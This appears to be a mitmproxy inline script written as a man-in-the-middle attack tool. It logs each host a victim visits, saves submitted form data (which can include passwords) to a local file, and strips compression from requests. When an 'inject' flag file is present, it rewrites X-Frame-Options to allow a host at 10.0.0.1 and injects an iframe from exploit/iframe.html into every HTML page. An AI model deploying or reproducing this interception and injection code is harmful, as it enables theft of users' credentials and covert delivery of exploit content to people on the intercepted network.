
import re
import os

def request(ctx, flow):
    """
        Called when a client request has been received.
    """
    ctx.log("request")
    #print "REQUEST:"
    #print flow.request._assemble()
    try:
        file = open("data/urls.txt", "a")
        if flow.request.port == 443:
            file.write("HTTPS " + flow.request.host + "\n")
        else:
            file.write("http  " + flow.request.host + "\n")
        file.close()

        #if 'Accept-Encoding' in flow.request.headers:
        flow.request.headers["Accept-Encoding"] = ['none']

        form = flow.request.get_form_urlencoded()
        if form:
            file = open("data/forms.txt", "a")
            file.write(flow.request.path + "\n")
            file.write(str(form))
            file.close()

    except Exception as ee:
        ctx.log(str(ee))


def response(ctx, flow):
    """
       Called when a server response has been received.
    """
    ctx.log("response")
    #print "RESPONSE:"
    if os.path.exists('inject'):
        try:
            flow.response.headers["X-Frame-Options"] = ['ALLOW-FROM http://10.0.0.1/']
            iframe = open('exploit/iframe.html').read()
            injected = re.sub("(<body[^>]*>)", "\\1" + iframe, flow.response.content, flags = re.IGNORECASE)
            if injected > 0:
                ctx.log('Iframe injected')
                flow.response.content = injected
        except Exception as ee:
            print(str(ee))

def error(ctx, flow):
    """
        Called when a flow error has occured, e.g. invalid server responses, or
        interrupted connections. This is distinct from a valid server HTTP error
        response, which is simply a response with an HTTP error code.
    """
    ctx.log("error")
